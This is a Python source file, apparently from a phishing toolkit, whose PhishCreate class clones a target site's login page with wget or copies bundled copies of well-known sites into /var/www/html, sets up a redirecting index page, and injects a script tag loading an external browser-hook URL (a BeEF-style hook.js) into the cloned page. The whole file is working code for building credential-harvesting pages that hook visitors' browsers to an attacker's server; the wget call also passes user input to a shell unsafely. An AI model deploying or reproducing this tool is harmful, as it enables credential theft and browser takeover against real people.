import subprocess
from pathlib import Path
import urllib.parse
from bs4 import BeautifulSoup
from sources import Sources
import time
import os
import re
from colorama import init, Fore
init()
GREEN = Fore.GREEN
RED   = Fore.RED
BLUE   = Fore.BLUE
RESET = Fore.RESET


class PhishCreate:
    def __init__(self):
        self.main_url = None

    def setup_phish_page(self,hook_url):
            print(f"{GREEN}\n[+] Phish Page Creation SETTINGS::::: \n",flush=True)
            print("\r--------------------------------------------------------------------------------")
            print("\r0. Phish Page of Login Page of Website using URL of login page")
            print("\r1. Phish Page of Famous Websites (URL not required)")
            print("\r2. Want to place your own Phish Page files in /var/www/html")
            print("\r3. Back.. \n")
            option = input(f"\rSelect the option by typing corresponding index number: 0-4 --> {RESET}")
            if option == "0":
                self.phish_page_by_url(hook_url)
            elif option == "1":
                self.phish_page_of_famous_website(hook_url)
            elif option == "2":
                self.own_phish_page_configure(hook_url)


    def phish_page_by_url(self,hook_url):
        try:
            os.system("clear")
            print(f"{BLUE}[!] Make sure you are connected to internet to Clone wesbite using url!!!! {RESET}")
            url = input(f"\n{GREEN} Please enter url of login page of website here:--> {RESET}")
            website_name = input(f"\n{GREEN} Please enter name for website to be saved in your computer. It could be random. :--> {RESET}")
            files_location = f'/var/www/html/'
            self.clone_website(url,files_location,website_name)
            urls = self.homepage_website_url(website_name)
            self.configuring_redirecting_index_file(urls)
            self.configuring_main_index_file(self.main_url,hook_url)
        except Exception as e:
            print(f"{RED}[--] Following Error Occur During Configuring Phish Page:>> {e}{RESET}")




    def phish_page_of_famous_website(self,hook_url):
        try:
            sites = Sources().list_directory(f"{os.getcwd()}/src/sites/")
            os.system("clear")
            print("[++] Following Famous sites are available for Captive Portal:::::")
            for i in range(0, len(sites), 3):
                line = '\t\t\t '.join(f"{j}: {sites[j]}" for j in range(i, min(i + 3, len(sites))))
                print(line)

            select_website = int(input("[++] Following websites are available for captive portal. Select one by typing corresponding number: ---> "))
            website = sites[select_website]
            Sources().copy_directory(f"{os.getcwd()}/src/sites/{website}","/var/www/html/")
            urls = self.homepage_website_url(website)
            self.configuring_redirecting_index_file(urls)
            self.configuring_main_index_file(self.main_url,hook_url)
        except Exception as e:
            print(f"{RED}[--] Following Error Occur During Configuring Captive Portal:>> {e}{RESET}")




    def own_phish_page_configure(self,hook_url):
        try:
            os.system("clear")
            print(f"\n {RED}[-][-]In order to configure your own website portal, Place all websites file in folder and Paste that folder in '/var/www/html' before running this program .{RESET}\n")
            result = Sources().list_directory('/var/www/html')
            website = int(input(f"{BLUE}[+]Your apache websites directory contain following website. Select the website by typing corresponding number to create captive using that directory: -->{RESET}"))
            urls = self.homepage_website_url(result[website])
            self.configuring_redirecting_index_file(urls)
            self.configuring_main_index_file(self.main_url,hook_url)
        except Exception as e:
            print(f"{RED}[--] Following Error Occur During Configuring Captive Portal:>> {e}{RESET}")


    def configuring_redirecting_index_file(self,urls):
        os.system("clear")
        if len(urls) == 1:
            self.main_url = f"/var/www/html{urls[0]}"
            url = urllib.parse.quote(urls[0], safe='/')
        else:
            i = 0
            for url in urls:
                print(f"{i}. {url}")
                i+=1
            url_select = input("Following Index files are found for website select the correct one that contain urls: ")
            if url_select == "":
                url_select = 0
            else:
                url_select = int(url_select)
            url = urllib.parse.quote(urls[url_select], safe='/')
            self.main_url = f"/var/www/html{urls[url_select]}"
        data = f'<!DOCTYPE html>\n<html lang="en">\n<head>\n\t<meta charset="UTF-8">\n\t<meta http-equiv="refresh" content="0; URL={url}">\n</head>\n<body>\n</body>\n</html>'
        html_file_path = "/var/www/html/index.html"
        Sources().create_file(html_file_path)

        try:
            with open(html_file_path, 'w') as f:
                f.write(data)
            print("[+]File " + html_file_path + " created successfully.")
        except IOError:
            print("Error: could not create file " + html_file_path)

        

    def configuring_main_index_file(self,file_path,hook_url):
        with open(file_path, 'r', encoding='utf-8') as file:
            html_content = file.read()
            
        soup = BeautifulSoup(html_content, 'html.parser')
        script_src_pattern = r"(http://.+:3000/hook\.js|https?://.+:443/hook\.js)"
            
        existing_script = None
        for script in soup.find_all('script'):
            src = script.get('src')
            if src and re.match(script_src_pattern, src):
                existing_script = script
                break

        if existing_script:
            existing_script['src'] = hook_url
        else:
            new_script_tag = soup.new_tag('script', src=hook_url)
            if soup.body:
                soup.body.append(new_script_tag)
            else:
                soup.append(new_script_tag)
                
        with open(file_path, 'w', encoding='utf-8') as file:
            file.write(str(soup))



    def clone_website(self,website,path,website_name):
        print(f"{GREEN}\n[+] Cloning login page::::{RESET}")
        result = subprocess.run(f"wget -m -k -p '{website}' -P '{path}{website_name}'", shell=True, capture_output=True, text=True)
        if website_name in Sources().list_directory(path):
            print(f"{GREEN}\n[+][+] Website is cloned Succussfully in folder name {website_name} !!!!!!!{RESET}")
        else:
            print(f"{RED}\n[-][-] Due to some issues, website could not cloned successfully. Try Again by starting from beginning ---- {RESET}")
        time.sleep(1)

    def homepage_website_url(self,website):
        url = f"/var/www/html/{website}"
        print(url)
        paths = []
        for path in Path(url).rglob('*.html*'):
            path = str(path).split("/html")[1]
            paths.append(path)
        return paths


    